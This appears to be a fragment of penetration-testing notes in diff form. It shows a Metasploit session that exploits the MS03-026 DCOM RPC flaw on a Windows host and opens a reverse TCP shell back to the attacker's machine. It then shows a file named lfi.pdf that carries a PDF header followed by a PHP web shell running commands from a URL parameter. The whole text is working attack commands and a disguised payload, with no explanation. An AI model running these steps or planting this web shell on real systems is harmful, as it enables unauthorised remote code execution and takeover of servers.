@@ -1,0 +1,17 @@
+msf > search dcom
+msf > use exploit/windows/dcerpc/ms03_026_dcom
+msf > set RHOST 10.0.0.3
+msf > show payloads
+msf > set PAYLOAD generic/shell_reverse_tcp
+msf > set LHOST 10.0.0.6
+msf > exploit
+sessions –i 1
+C: >dir
+
+wc lfi.pdf
+ 4  4 42 lfi.pdf
+ cat lfi.pdf
+%PDF-1.4
+<?php
+  system($_GET["cmd"]);
+?>
